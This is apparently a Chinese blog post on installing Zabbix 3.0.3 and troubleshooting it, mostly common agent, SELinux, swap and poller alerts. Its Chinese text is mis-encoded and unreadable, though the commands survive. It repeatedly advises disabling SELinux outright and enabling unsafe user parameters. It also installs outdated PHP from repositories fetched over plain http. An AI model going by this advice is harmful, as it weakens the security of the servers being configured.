/usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/UnsafeUserParameters=1 #å¯ç”¨è‡ªå®šä¹‰key:wq! #ä¿å­˜é€€å‡º 1.2 COPYç›¸å…³è„šæœ¬åˆ°æ–°ç¼–è¯‘çš„ç›®å½•ä¸‹ 123456789101112131415161718 cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server[root@salt etc]# cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentdä¿®æ”¹è„šæœ¬è·¯å¾„ï¼švim /etc/init.d/zabbix_server BASEDIR=/usr/local/zabbix/vim /etc/init.d/zabbix_agentdBASEDIR=/usr/local/zabbix chmod +x /etc/rc.d/init.d/zabbix_server #æ·»åŠ è„šæœ¬æ‰§è¡Œæƒé™chmod +x /etc/rc.d/init.d/zabbix_agentd #æ·»åŠ è„šæœ¬æ‰§è¡Œæƒé™chkconfig zabbix_server on #æ·»åŠ å¼€æœºå¯åŠ¨chkconfig zabbix_agentd on #æ·»åŠ å¼€æœºå¯åŠ¨ å…«ã€é…ç½®webç«™ç‚¹ 1234cd zabbix-2.4.8cp -r /zabbix-2.4.8/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbix service zabbix_server start #å¯åŠ¨zabbixæœåŠ¡ç«¯ service zabbix_agentd start #å¯åŠ¨zabbixå®¢æˆ·ç«¯ ç„¶åé‡å¯æœåŠ¡ã€‚ å‘ç°å‡ºç°500 ç½‘é¡µæ— æ³•æ˜¾ç¤ºï¼Œæˆ‘å»ç½‘ä¸ŠGoogleäº†ä¸‹ï¼Œè¯´æˆ‘çš„PHPæ–‡ä»¶ç‰ˆæœ¬è¿‡ä½ã€‚ æˆ‘æŸ¥çœ‹äº†ä¸‹æˆ‘çš„ç‰ˆæœ¬ï¼š 1234567php -versionPHP 5.3.3 (cli) (built: Feb 9 2016 10:36:17)Copyright (c) 1997-2010 The PHP GroupZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologieswhereis phpphp: /usr/bin/php /etc/php.d /etc/php.ini /usr/lib64/php /usr/share/php /usr/share/man/man1/php.1.gz æŸ¥è¯¢äº†ä¸‹è¿™æ˜¯é»˜è®¤å®‰è£…çš„ï¼Œyumå®‰è£…çš„ã€‚ mv /usr/share/php/ /usr/share/php.5.3.3å¤‡ä»½ä¹‹å‰çš„æ–¹ä¾¿å›æ»šï¼Œç„¶åå‡çº§PHPï¼š å¿«é€Ÿå°†PHP 5.3å‡çº§è‡³PHP 5.5CentOS 6.7ä»¥ä¸‹ä¸º CentOS ä¸‹å®‰è£… PHP æ–¹æ³•ï¼š æ·»åŠ  epel æº 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm æ·»åŠ  remi æº 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm å®‰è£… PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt æŸ¥çœ‹ PHP ç‰ˆæœ¬ 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies å¯åŠ¨ php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] è¿™é‡Œé‡å¯å®Œä»¥åï¼Œè®°å¾—è¦è®©phpç”Ÿæ•ˆï¼Œä¸ç„¶çš„è¯ä¸è¡Œã€‚ æˆ‘ä¸€å¼€å§‹åˆ·æ–°è¿˜æ˜¯å‡ºç°äº†500é”™è¯¯ï¼Œåæ¥ç”¨phpæŒ‡é’ˆæµ‹è¯•äº†ä¸‹ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ wwwç«™ç‚¹æ·»åŠ ã€‚info.php 12345&lt;?php phpinfo();?&gt;; è®¿é—®åœ°å€/info.php å‡ºç°ç‰ˆæœ¬æ˜¯5.3 ç¯å¢ƒé—®é¢˜ï¼Œé‡å¯httpå°±å¯ä»¥äº†ã€‚ è¿™é‡Œå·²ç»æå®šå’¯ã€‚ å¦‚æœå‡ºç°å›¾å½¢ä¹±ç ï¼šå¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡æ¡£ã€‚ å…¶å®æŠŠä¹‹å‰çš„å­—ä½“æ‹·è´è¿‡å»ï¼Œç„¶åå…ˆä¿®æ”¹ä¸‹é…ç½®æ–‡ä»¶å³å¯ã€‚ 1cp /var/www/html/zabbix.2.4.7/fonts/simkai.ttf /var/www/html/zabbix/fonts/. zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2016/06/19/æ€§èƒ½ç›‘æ§/Zabbix/zabbix-server3-0-3ç‰ˆæœ¬ç¯å¢ƒå®‰è£…éƒ¨ç½²/"},{"title":"zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","text":"TOCæ•ˆæœå¦‚ä¸‹ï¼š[TOC] 1.Zabbixçº¢è‰²å¼¹å‡ºæŠ¥é”™ zabbix server is not running: the information displayed may not be current123456789101112131415161718192021222324252627* æ’é”™:* 1. æ£€æŸ¥ /var/www/html/zabbix/conf/zabbix.conf.php ç¡®å®š $DB['DATABASE'] æ•°æ®åº“$DB['USER'] ç”¨æˆ·$DB['PASSWORD'] å¯†ç è¿™ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯æ­£ç¡®çš„ã€‚ æ³¨æ„ï¼šæ¯æ¬¡æ”¹äº†å‚æ•°æ–‡ä»¶ä¸€å®šè¦è®°å¾—é‡å¯zabbix_serverè¿™é‡Œéƒ½æ²¡é—®é¢˜ã€‚2. å…³é—­SELinuxçš„æ–¹æ³•:ä¿®æ”¹/etc/selinux/configæ–‡ä»¶ä¸­çš„SELINUX=\"\" ä¸º disabled ï¼Œç„¶åé‡å¯ã€‚å¦‚æœä¸æƒ³é‡å¯ç³»ç»Ÿï¼Œä½¿ç”¨å‘½ä»¤setenforce 0æ³¨:setenforce 1 è®¾ç½®SELinux æˆä¸ºenforcingæ¨¡å¼setenforce 0 è®¾ç½®SELinux æˆä¸ºpermissiveæ¨¡å¼ åœ¨liloæˆ–è€…grubçš„å¯åŠ¨å‚æ•°ä¸­å¢åŠ ï¼šselinux=0,ä¹Ÿå¯ä»¥å…³é—­selinuxselinuxæ˜¯å¦å…³é—­ã€‚ä¸€å®šè¦å…³é—­è¿™ä¸ªï¼Œå¼€å¯selinuxä¼šå¼•èµ·ä¸€è¿ä¸²é—®é¢˜ï¼Œç”šè‡³zabbixçš„discoveryåŠŸèƒ½ä¹Ÿä¸èƒ½æ­£å¸¸ä½¿ç”¨3. ä¸Šé¢éƒ½æ²¡æœ‰é—®é¢˜ç„¶ååœ¨æŸ¥çœ‹æœåŠ¡æ˜¯å¦æ­£å¸¸å¯åŠ¨ã€‚æŸ¥çœ‹/tmp/zabbix_server.logå’Œ/tmp/zabbix_agent.logæ— ä»»ä½•å¼‚å¸¸ã€‚å¦‚æœæ—¥å¿—æç¤ºæŸ¥æ‰¾ä¸åˆ°ä¸»æœºåï¼Œæˆ‘ä»¬çœ‹ä¸‹æœåŠ¡æ˜¯å¦å¯åŠ¨ã€‚4. çœ‹zabbix_serverå’Œzabbix_agentè¿›ç¨‹ã€ç«¯å£éƒ½æ­£å¸¸ netstat -ntulpå¦‚æœæ²¡æœ‰å¯åŠ¨ éœ€è¦æ‰‹åŠ¨å¯åŠ¨ä¸‹ï¼Œè¿™é‡Œå¯èƒ½æœåŠ¡æ²¡æœ‰å¯åŠ¨ï¼Œå¯åŠ¨æœåŠ¡å³å¯ã€‚ 2.Zabbix-agentdæ—¥å¿—æŠ¥é”™Get value from agent failed: cannot connect to [[192.168.1.218]:10050]: [113] No route to host12345678* æ’é”™:çœ‹æç¤ºâ€œNo route to hostâ€ï¼Œä¸ç½‘ç»œè¿æ¥æœ‰å…³ã€‚æ’é™¤çš„æ–¹æ³•å¦‚ä¸‹:aï¼‰æŸ¥çœ‹192.168.30.3è¿™å°æœºå™¨æ˜¯å¦å·²å¼€æœºb)åœ¨zabbix serverç«¯å‘è¿™å°æœºå™¨pingï¼Œçœ‹ç½‘ç»œæ˜¯å¦é€šcï¼‰ç”¨telnet ç™»å½•10050å’Œ10051ç«¯å£ï¼Œçœ‹è¯¥ä¸»æœºæ˜¯å¦å…è®¸è¿™ä¸¤ä¸ªç«¯å£é€šè®¯d)æŸ¥çœ‹iptablesé˜²ç«å¢™è§„åˆ™æ˜¯å¦æ‹¦æˆª10050ã€10051ç«¯å£ 3.æ—¶é—´ä¸åŒæ­¥Check if client local time is in sync with Zabbix server time123456789101112131415å› ä¸ºæˆ‘åœ¨æˆ‘çš„ç½‘ç»œä¸­çš„ä¸€äº›NTPæœåŠ¡å™¨ï¼Œè¿™å°†æ˜¯å¾ˆå¥½èƒ½å¤Ÿæµ‹é‡ä¸»æœºå’Œè¿™äº›æœåŠ¡å™¨ä¹‹ä¸€ä¹‹é—´çš„æ—¶é—´å·®ã€‚å¯æ‚²çš„æ˜¯ï¼Œè¿™å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚ä½†æœ‰ä¸€ä¸ªè§£å†³æ–¹æ¡ˆ:`system.localtime.fuzzytime`ï¼Œç…§é¡¾è¿™åªæ˜¯ä¸€ä¸ª!!!è§¦å‘çš„â€œfuzzytimeâ€åŠŸèƒ½å‘å‡ºè­¦æŠ¥ï¼Œå¦‚æœè¢«ç›‘æ§æœåŠ¡å™¨çš„æ—¶é—´æ¼‚ç§»ã€‚å®ƒæ¯”è¾ƒæŠ¥å‘Šä¸»æœºçš„æ—¶é—´çš„zabbixæœåŠ¡å™¨åœ¨è§¦å‘å™¨è¢«å¤„ç†çš„æ—¶é—´ä¸Šçš„æ—¶é—´ã€‚fuzzytimeï¼ˆç§’ï¼‰ï¼Œå¯èƒ½æ˜¯ï¼ˆæµ®ç‚¹ï¼Œæ•´æ•°ï¼‰:è¿”å›1ï¼Œå¦‚æœæ—¶é—´æˆ³ï¼ˆé¡¹ç›®å€¼ï¼‰ä¸ä»çš„zabbixæœåŠ¡å™¨æ—¶é—´æœ‰æ‰€ä¸åŒè¶…è¿‡Nç§’ï¼Œ0 -å¦åˆ™é€šå¸¸ç”¨äºsystem.localtimeæ£€æŸ¥æœ¬åœ°æ—¶é—´åœ¨æœåŠ¡å™¨çš„zabbixæœ¬åœ°æ—¶é—´åŒæ­¥ã€‚æ³¨:æ·»åŠ å…¬å¼æ—¶ï¼Œä½¿ç”¨â€œæ·»åŠ â€æŒ‰é’®ï¼Œåœ¨å³ä¾§ï¼Œè¿™æ˜¯å¾ˆç®€å•çš„è¿™ç§æ–¹å¼ï¼ç³»ç»Ÿæ—¶é—´è·Ÿæˆ‘ç°åœ¨åŒ—äº¬æ—¶é—´ä¸åŒæ­¥ã€‚date -R æŸ¥çœ‹ä¸‹éœ€è¦æ‰‹åŠ¨æ·»åŠ è®¡åˆ’ä»»åŠ¡åŒæ­¥ä¸‹ï¼Œè®¾ç½®å¼€æœºå¯åŠ¨ã€‚è¿™é‡ŒIPæ˜¯zabbix-server IP00 * * * * /usr/sbin/ntpdate 192.168.47.20 &gt;/dev/null 2&gt;&amp;1 è¿˜æœ‰ä¸æ‡‚å¾—å¯ä»¥çœ‹:å‚è€ƒ 4.MySQLå†…å­˜ä¸å¤Ÿ Lack of available memory on server MySQL12345æ•…éšœåŸå› :Lack of available memory on server argus047072éœ€è¦æ·»åŠ å†…å­˜æ•…éšœåŸå› :Redisé“¾æ¥æ•°è¶…è¿‡æœ€å¤§å®¢æˆ·ç«¯æ•°é‡é™åˆ¶ã€‚æ˜¯å¦æœ‰å¤§é‡çš„è¿›ç¨‹åœ¨åå°è¿è¡Œ 5.Zabbix-agentä¸é€šReceived empty response from Zabbix Agent123456789å‡ºç°å¦‚ä¸‹é”™è¯¯:Received empty response from Zabbix Agent at [192.168.1.2]. Assuming that agent dropped connection because of access permissionå¤§æ¦‚æ„æ€æ˜¯è¯´æ²¡æœ‰æƒé™è®¿é—®agentç«¯å£10050ï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹:# cat zabbix_agentd.conf| grep Server=Server=192.168.1.2 # zabbix server ipåœ°å€å¦‚æœä½ çš„serveræœ‰å¤šä¸ªIPåœ°å€ï¼Œä½¿ç”¨é€—å·åˆ†éš”å¤šä¸ªIPåœ°å€ã€‚ 6.ZabbixæŠ¥é”™ç£ç›˜ä¸è¶³Free disk space is less than 20% on volume /home1234567891011121314151617181920212223ç£ç›˜æ€»å…±å¤§å°du -Thå®šä½æŸ¥çœ‹æ˜¯ä»€ä¹ˆæ¶ˆè€—é‚£ä¹ˆå¤šç£ç›˜ç©ºé—´ï¼ŒæŸ¥çœ‹homeç›®å½•ã€‚du -s -h /srv/tomcat/tomcat_account/logs/* | sort1G localhost.2015-12-21.log2G localhost.2015-12-22.log2G localhost.2015-12-23.log.....find /srv/tomcat/tomcat_account/logs/ -mtime +1 -name \"*.log\" -exec rm -rf &#123;&#125; \\;è¿™ä¸ªä¿ç•™å‰ä¸€å¤©çš„æ—¥å¿—å…¶ä½™éƒ½åˆ é™¤ã€‚1. è®¡åˆ’ä»»åŠ¡è„šæœ¬æ¸…é™¤å‰ä¸€å¤©00 00 * * * find /home/admin/output/ -mtime +1 -exec rm &#123;&#125; \\;2. æˆ–è€…ä½¿ç”¨è„šæœ¬æ”¾åˆ°è®¡åˆ’ä»»åŠ¡é‡Œé¢è·‘1 0 * * * /opt/soft/log/qingli-log.sh &gt;/dev/null 2&gt;&amp;1è¿™é‡Œçš„è®¾ç½®æ˜¯æ¯å¤©å‡Œæ™¨0ç‚¹1åˆ†æ‰§è¡Œqingli-log.sh .shæ–‡ä»¶è¿›è¡Œæ•°æ®æ¸…ç†ä»»åŠ¡äº†ã€‚åœ¨æŸ¥çœ‹ç£ç›˜æ€»å…±å¤§å° 7.Zabbixç›‘æ§æŠ¥é”™zabbix server is not running: the information displayed may not be current1234567æ•…éšœåŸå› :Zabbix agent on labs047093 is unreachable for 5 minutesZabbixä½¿ç”¨ä¸€æ®µæ—¶é—´åæ€»æ˜¯æŠ¥Zabbix Agentä¸å¯åˆ°è¾¾è§£å†³ç»“æœ:è¿™ä¸‰å°æœºå™¨ç½‘ç»œä¸é€šï¼Œsshè¿æ¥ä¸ä¸Šï¼Œæ’é”™æ–¹æ³•æŸ¥çœ‹æ—¥å¿—æ˜¯å¦æœ‰æŠ¥é”™ï¼Œæ˜¯å¦æœåŠ¡æ²¡æœ‰èµ·æ¥ã€‚å¦‚æœæ•°æ®åº“æœåŠ¡å™¨æ˜¯ä¸€ç›´æ­£å¸¸çš„ï¼ŒSELinuxæ˜¯äº‹å…ˆå…³é—­æ²¡æœ‰ï¼Œä¿®æ”¹å®Œä¸Šè¿°æ‰€æåˆ°çš„åå‘ç°é—®é¢˜ä¾ç„¶ã€‚Zabbixä¾ç„¶æŠ¥é”™ï¼ˆZabbix Server Messages: PROBLEM: Zabbix agent on Zabbix server is unreachable for 5 minutesã€‚æŸ¥çœ‹æ—¥å¿—æŠ¥ä»€ä¹ˆé”™ï¼Œå®šä½è§£å†³é—®é¢˜ï¼Œä¸€èˆ¬å‡ºç°è¿™ä¸ªå¤§éƒ¨åˆ†æ•°æ®å»¶è¿Ÿå¯¼è‡´ï¼Œåœ¨å›¾å½¢ä¸Šé¢æ˜æ˜¾çœ‹åˆ°æœ‰4åˆ°5åˆ†é’Ÿæ•°æ®æ˜¯ç©ºç™½çš„ã€‚ 8.Zabbixå›¾å½¢å‡ºç°ä¹±ç æˆ–è€…æ²¡æœ‰æ–‡å­—å‚è€ƒæ–‡æ¡£:zabbix2.4å›¾å½¢ä¹±ç  9.Zabbixç›‘æ§ä¹‹é‚®ä»¶å‘Šè­¦å‘é€å¤±è´¥smtp-server: é”™è¯¯ä»£ç 550ä¸535å‚è€ƒæ–‡æ¡£:zabbix163é‚®ä»¶å‘Šè­¦é”™è¯¯ä»£ç  10.Zabbixä¸­æç¤ºï¼šLack of free swap space on hostname12345678910111213141516171819202122232425262728293031323334æç¤ºï¼šç¼ºäº¤æ¢ç©ºé—´å¯ä»¥åˆ›å»ºä¹Ÿå¯ä»¥ä¸ç”¨åˆ›å»ºã€‚[root@xx ~]# free -m total used free shared buffers cachedMem: 3832 3488 343 0 267 2389-/+ buffers/cache: 831 3000swap: 0 0 0ä¸ªèˆ¬ç‰©ç†æœºä¸å¯èƒ½ä¸è®¾äº¤æ¢åˆ†åŒºï¼Œæ˜¾ç„¶è¿™æ ·çš„è®¾è®¡æ²¡æœ‰è€ƒè™‘åˆ°äº‘ä¸»æœºç”¨æˆ·ã€‚åªéœ€è¦è°ƒèŠ‚ç›‘æ§æ–‡ä»¶ï¼Œå³å¯è§£å†³é—®é¢˜ï¼šè§£å†³æ­¤é—®é¢˜çš„æ­¥éª¤å¦‚ä¸‹:é€‰æ‹© Configuration-&gt;Templates(æ¨¡æ¿),åœ¨æ¨¡æ¿ç•Œé¢ä¸­é€‰æ‹©Template OS Linuxå³ä¾§çš„Triggersï¼ˆè§¦å‘å™¨ï¼‰,åœ¨è§¦å‘å™¨é¡µé¢ä¸­æ‰“å¼€Lack of free swap space on &#123;HOST.NAME&#125;é¡¹ç›®,åœ¨æ–°æ‰“å¼€çš„è§¦å‘å™¨ç¼–è¾‘é¡µé¢ä¸­ä¿®æ”¹Expressionï¼ˆè¡¨è¾¾å¼ï¼‰çš„å†…å®¹,ç”±åŸå…ˆçš„&#123;Template OS Linux:system.swap.size[,pfree].last(0)&#125;&lt;50ä¿®æ”¹ä¸º&#123;Template OS Linux:system.swap.size[,pfree].last(0)&#125;&lt;50 and &#123;Template OS Linux:system.swap.size[,free].last(0)&#125;&lt;&gt;0 æ­¤å¤„ä¿®æ”¹å¢åŠ äº†â€œand&#123;Template OS Linux:system.swap.size[,free].last(0)&#125;&lt;&gt;0â€åˆ¤æ–­ç³»ç»Ÿæœ‰äº¤æ¢ç©ºé—´ï¼Œå½“ç³»ç»Ÿæ— äº¤æ¢ç©ºé—´&#123;Template OSLinux:system.swap.size[,free].last(0)&#125;çš„å€¼ä¸º0æ—¶å°†ä¸ä¼šä½¿è¡¨è¾¾å¼æˆç«‹ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘é”™è¯¯æç¤ºã€‚ä¿å­˜ååœ¨ä¸‹ä¸€ä¸ªæ›´æ–°å‘¨æœŸå†…zabbixä¹‹å‰æŠ¥å‘Šâ€œLack of free swap spaceâ€é—®é¢˜å°±ä¼šè¢«è‡ªåŠ¨æ ‡è®°ä¸ºResolved.æˆ–è€…åˆ›å»ºï¼š1ã€é¦–å…ˆçœ‹ä¸€ä¸‹å†…å­˜free -m2ã€ç„¶ååˆ›å»ºä¸€ä¸ªåˆ†åŒºæ·»åŠ äº¤æ¢æ–‡ä»¶mkdir /etc/swap/dd if=/dev/zero of=/etc/swap/swap bs=1024 count=1024000 1ä¸ªG3ã€åˆ›å»ºäº¤æ¢ç©ºé—´mkswap /etc/swap/swap4ã€å¯åŠ¨äº¤æ¢ç©ºé—´swapon /etc/swap/swap5ã€æŸ¥çœ‹æ–°å¢ç©ºé—´free -tom6ã€ä¿®æ”¹/etc/fstabæ–‡ä»¶ä½¿ç³»ç»Ÿåœ¨é‡æ–°å¯åŠ¨çš„æ—¶å€™ç”Ÿæ•ˆ/etc/swap/swap swap swap defaults 0 0 11.Zabbix-agentæ—¥å¿—ç«¯hostnameä¸ä¸€è‡´ï¼šcannot send list of active checks to [192.168.0.1]: host [Zabbix server] not found123456æŸ¥çœ‹è¢«ç›‘æ§æœºä¸Šçš„/tmp/zabbix_agentd.logï¼Œæ˜¾ç¤ºæ—¥å¿—ï¼šNo active checks on server: host [Zabbix server] not foundè¿™æ˜¯å› ä¸ºï¼Œé€šè¿‡zabbix dashboardé¡µé¢é…ç½®çš„è¢«ç›‘æ§ä¸»æœºåè·Ÿè¢«ç›‘æ§ä¸»æœºä¸Šzabbix_agentd.confä¸­é…ç½®çš„Hostnameä¸ä¸€è‡´ã€‚ä¿®æ”¹ä¸ºä¸€è‡´çš„åå­—åï¼Œé‡å¯zabbix_agentdå³å¯ã€‚ 12.è§£å†³CentOS 7å®‰è£…zabbix 3.0 æ— æ³•å¯åŠ¨zabbix-serverçš„é—®é¢˜12345678910[root@kvm zabbix_agentd.d]# service zabbix-agent restartRedirecting to /bin/systemctl restart zabbix-agent.serviceJob for zabbix-agent.service failed because a configured resource limit was exceeded. See \"systemctl status zabbix-agent.service\" and \"journalctl -xe\" for details.è§£å†³æ–¹æ¡ˆ:å…³é—­SELinuxæœåŠ¡ ã€‚ æ‰§è¡Œå‘½ä»¤setenforce 0 3. é‡å¯zabbixsystemctl restart zabbix-server.service 13.zabbix è¿”å›å€¼ä¸ºç©º é”®å€¼æ¨¡æ¿æŠ¥é”™ï¼šReceived value [] is not suitable for value type [Numeric (unsigned)] and data type [Decimal]1234567891011è§£å†³ï¼šæœ¬åœ°è„šæœ¬è·å–å€¼æœ‰è¿”å›ï¼Œè„šæœ¬æ²¡æœ‰zabbixèµ‹æƒ~ç›‘æ§ç«¯æ‰§è¡Œè„šæœ¬ï¼š[root@jollychic-db-slave4 zabbix]# sh mysql3307.sh Qcache_queries_in_cache87zabbix æœåŠ¡ç«¯ï¼š[root@yum-zabbix ~]# zabbix_get -s 10.155.74.247 -k mysql.status3307[Threads_running]è¿”å›ç©ºè¿™é‡Œå°±æ˜¯è„šæœ¬æ²¡æœ‰zabbixèµ‹æƒ~è¿™é‡Œè„šæœ¬éœ€è¦æ·»åŠ ä¸‹-h127.0.0.1 å³å¯ 14.è§£å†³Zabbixâ€œZBX_NOTSUPPORTED: Timeout while executing a shell scriptâ€12345678910111213141516è§£å†³æ–¹æ¡ˆï¼ˆ1ï¼‰ä¿®æ”¹zabbix_serverçš„zabbix_server.confï¼š[root@nmp01 scripts]# vim /usr/local/zabbix/etc/zabbix_server.confä¿®æ”¹ä»¥ä¸‹å‚æ•°ï¼šTimeout=30æ³¨ï¼šè¶…æ—¶æ—¶é—´ä¸º30ç§’ï¼ˆ2ï¼‰ä¿®æ”¹è„šæœ¬æ‰€åœ¨zabbix_agentdçš„zabbix_agentd.confï¼švim /usr/local/zabbix/etc/zabbix_agentd.confä¿®æ”¹ä»¥ä¸‹å‚æ•°ï¼šTimeout=30ï¼ˆ3ï¼‰é‡å¯zabbixæœåŠ¡ç«¯å’Œè„šæœ¬æ‰€åœ¨å®¢æˆ·ç«¯ï¼šservice zabbix_server restartservice zabbix_agentd restart 15.Zabbix3.0 poller processes more than 75% busyè­¦æŠ¥å¤„ç†å‘Šè­¦åŸå› ï¼š 1.æŸä¸ªè¿›ç¨‹å¡ä½äº†ï¼Œ2.åƒµå°¸è¿›ç¨‹å‡ºé”™ï¼Œå¤ªå¤šï¼Œå¯¼è‡´æ…¢äº†3.ç½‘ç»œå»¶è¿Ÿï¼ˆå¯å¿½ç•¥ï¼‰4.zabbixæ¶ˆè€—çš„å†…å­˜å¤šäº† ä¸€ï¼šç®€å•ï¼Œç²—æš´ï¼ˆé‡å¯zabbix-serverå¯ç»“åˆå®šæ—¶ä»»åŠ¡ä½¿ç”¨ï¼‰ è™½ç„¶Zabbixçš„ç›‘æ§è­¦æŠ¥å„ç§æœ‰ï¼Œä½†yancyä½¿ç”¨ç¢°åˆ°æœ€å¤šçš„å‡ ä¸ªè«è¿‡äºå†…å­˜è€—å°½ï¼Œç½‘ç»œä¸é€šï¼ŒIOå¤ªæ…¢è¿˜æœ‰è¿™ä¸ªâ€œZabbix poller processes more than 75% busyâ€äº†ã€‚ä¸€å¼€å§‹çš„æ—¶å€™å› ä¸ºè¿™ä¸ªå³ä¸å½±å“ä½¿ç”¨ä¹ŸæŒç»­ä¸€ä¼šå„¿å°±è‡ªè¡Œè§£å†³å°±æ²¡æœ‰å¤šåœ¨æ„ã€‚ç„¶åéšç€æ•°æ®åº“çš„å¢å¤§ï¼ŒZabbixæ¶ˆè€—çš„å†…å­˜å¯æ˜¯è¶Šæ¥è¶Šå¤šï¼ŒPoller processesï¼ˆè½®è¯¢ï¼‰å¼€å§‹å¤©å¤©Busyäº†ï¼Œæœ€ç»ˆyancyä¸å¾—ä¸æŠŠZabbixæŒªåˆ°äº†å¦å¤–ä¸€å°æœåŠ¡å™¨ä¸Šã€‚ ä½†è¿™å¹¶æ²¡æœ‰å½»åº•è§£å†³é—®é¢˜ï¼Œè­¦æŠ¥ä»ç„¶ä¸‰å¤©ä¸¤å¤´æ¥å‡ ä¸ªã€‚ä¹‹åKaijiaå¼€å¯äº†Zabbixè­¦æŠ¥çš„é‚®ä»¶åŠŸèƒ½ï¼Œäºæ˜¯å¼€å§‹é¢‘ç¹æ”¶åˆ°è¿™ç±»é‚®ä»¶ï¼Œäºæ˜¯Kaijiaå†³å®šè§£å†³è¿™ä¸ªé—®é¢˜ã€‚Googleäº†ä¸€ä¸‹èµ„æ–™ï¼Œæ²¡æœ‰æ‰¾åˆ°å¾ˆæƒå¨çš„ç­”æ¡ˆï¼Œé€ æˆè½®è¯¢å¿™çš„é—®é¢˜æœ‰å¾ˆå¤šä¸­ï¼Œæ”¯æ’‘Zabbixçš„MySQLå¡ä½äº†ï¼ŒZabbixæœåŠ¡å™¨çš„IOå¡ä½äº†éƒ½æœ‰å¯èƒ½ï¼ŒZabbixè¿›ç¨‹åˆ†é…åˆ°å†…å­˜ä¸è¶³éƒ½æœ‰å¯èƒ½ã€‚ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯å¢åŠ Zabbix Serverå¯åŠ¨æ—¶åˆå§‹åŒ–çš„è¿›ç¨‹æ•°é‡ï¼Œè¿™æ ·ç›´æ¥å¢åŠ äº†è½®è¯¢çš„è´Ÿè½½é‡ï¼Œä»æ¯”ä¾‹ä¸Šæ¥è®²å¿™çš„æƒ…å†µå°±å°‘äº†ã€‚ å¢åŠ åˆå§‹åŒ–è¿›ç¨‹çš„æ–¹æ³•éå¸¸ç®€å•ï¼Œç¼–è¾‘Zabbix Serverçš„é…ç½®æ–‡ä»¶/etc/zabbix/zabbix_server.confï¼Œæ‰¾åˆ°é…ç½®StartPollersçš„æ®µè½ï¼š 12345671. ### Option: StartPollers2. # Number of pre-forked instances of pollers.3. #4. # Mandatory: no5. # Range: 0-10006. # Default:7. # StartPollers=5 å–æ¶ˆStartPollers=ä¸€è¡Œçš„æ³¨é‡Šæˆ–è€…ç›´æ¥åœ¨åé¢å¢åŠ ï¼š 1StartPollers=10 å› ä¸ºä¹‹å‰zabbixé™¤äº†å•ç‹¬è·‘ä¸€ä¸ªserveræœåŠ¡è¿˜æœ‰agentè¿˜æœ‰grafana-serverè¿˜æœ‰ä»£ç†ï¼Œåé¢æˆ‘å…ˆæ‰©å¤§å†…å­˜å’ŒæœåŠ¡å™¨CPU.å°†StartPollersæ”¹æˆå¤šå°‘å–å†³äºæœåŠ¡å™¨çš„æ€§èƒ½å’Œç›‘æ§çš„æ•°é‡ï¼ŒKaijiaå°†StartPollersè®¾ç½®æˆ12ä¹‹åå°±å†æ²¡æœ‰é‡åˆ°è¿‡è­¦æŠ¥ã€‚å¦‚æœå†…å­˜è¶³å¤Ÿçš„è¯å¯ä»¥è®¾ç½®æ›´é«˜ã€‚è®¾ç½®å®Œæˆä¹‹åè¿è¡Œï¼š 1service zabbix-server restart é‡å¯Zabbixã€‚å½“ç„¶å¦å¤–ä¸€ç§ä»æ•´ä½“ä¸Šé™ä½ZabbixæœåŠ¡å™¨è´Ÿè½½çš„æ–¹æ³•å°±æ˜¯å®šæœŸé‡å¯Zabbixï¼Œè¿™ç§æ–¹æ³•å¯ä»¥ç”¨Cronå®ç°ï¼Œè¿è¡Œï¼š 1crontab -e åœ¨è°ƒå‡ºçš„Cronç¼–è¾‘å™¨ä¸­å¢åŠ ä¸€ä¸ªè®¡åˆ’ï¼š 100 * * * * service zabbix-server restart &gt; /dev/null 2&gt;&amp;1 è¿™ä¸ªè®¡åˆ’ä¼šæ¯å¤©è‡ªåŠ¨é‡å¯ZabbixæœåŠ¡ä»¥ç»“æŸåƒµå°¸è¿›ç¨‹å¹¶æ¸…ç†å†…å­˜ç­‰ã€‚ç›®å‰Kaijiaè¿™æ ·é…ç½®Zabbixåè¿˜æ²¡æœ‰å†æ¬¡é‡åˆ°è¿‡â€œZabbix poller processes more than 75% busyâ€çš„é—®é¢˜ã€‚ 16ã€Zabbix3.0-monitoringå‡ºç°ä¹±ç å‡ºç°ä¹±ç ï¼š ä¹±ç 